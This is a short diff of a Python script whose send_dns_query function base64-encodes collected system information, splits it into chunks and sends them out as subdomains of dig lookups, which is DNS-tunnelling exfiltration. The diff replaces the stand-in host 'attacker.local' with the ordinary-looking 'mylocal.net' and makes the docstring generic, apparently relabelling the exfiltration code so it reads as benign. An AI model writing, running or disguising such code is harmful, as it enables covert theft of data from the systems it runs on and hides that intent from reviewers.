@@ -27,7 +27,7 @@ def collect_system_info():
         return f"error:{str(e)}"
 
 def send_dns_query(data):
-    """Send data via DNS query to attacker.local domain."""
+    """Send data via DNS query to <specified> domain."""
     try:
         # Encode data in base64
         encoded_data = base64.b64encode(data.encode()).decode()
@@ -38,7 +38,7 @@ def send_dns_query(data):
         
         for i, chunk in enumerate(chunks):
             # Create DNS query
-            domain = f"chunk{i}.{chunk}.attacker.local"
+            domain = f"chunk{i}.{chunk}.mylocal.net"
             try:
                 # Use dig command to query
                 subprocess.run(['dig', '+short', domain], 
